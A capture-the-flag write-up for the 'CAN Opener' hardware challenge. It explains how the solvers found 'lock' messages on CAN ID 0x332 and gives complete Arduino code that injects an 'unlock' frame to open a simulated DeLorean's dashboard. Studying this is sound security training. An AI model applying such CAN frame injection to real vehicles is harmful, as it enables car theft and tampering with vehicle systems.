## CAN Opener (150)

### Description

Our operatives have recovered a DeLorean in the ruins of an old mid-west US town. It appears to be locked, but we have successfully accessed its internal communications channels. According to the little data we have, the DeLorean internally uses an archaic technology called CAN bus. We need you to analyze the communications and find a way to unlock the vehicle; once unlocked, recover the secret flag stored inside. We have reason to believe that vehicle entry should be a fairly easy challenge, but to aid you in this, we have restored and reconnected the vehicle dashboard.

Best of luck.

The Dashboard app is available here.

Challenge developed by Argus Cyber Security.

### Write-up

The easiest of CAN challenges. To solve we used Arduino + Arduino CAN-BUS Shield.

Using logic analyzer we found out CAN speed was 50 kBps.

The board sends several types messages between its CAN
controllers. Messages with id 0x332 has text `lock\x00\x00\x00\x00` in payload.
To get flag you just need to send `unlock\x00\x00` with the same id. After 
receiving unlock message, the board prints flag in the dashboard app.

Arduino source code:
```c
// https://github.com/Seeed-Studio/CAN_BUS_Shield
#include <mcp_can.h>
#include <SPI.h>

const int SPI_CS_PIN = 10;

MCP_CAN CAN(SPI_CS_PIN); // Set CS pin

void setup()
{
    Serial.begin(115200);

    while (CAN_OK != CAN.begin(CAN_50KBPS, MCP_16MHz)) {
        Serial.println("CAN BUS Shield init fail");
        Serial.println(" Init CAN BUS Shield again");
        delay(100);
    }
    Serial.println("CAN BUS Shield init ok!");
}

unsigned char msg[8] = {0x75, 0x6E, 0x6C, 0x6F, 0x63, 0x6B, 0x00, 0x00};
void loop()
{
    CAN.sendMsgBuf(0x332, 0, 8, msg);
    delay(100);
}
```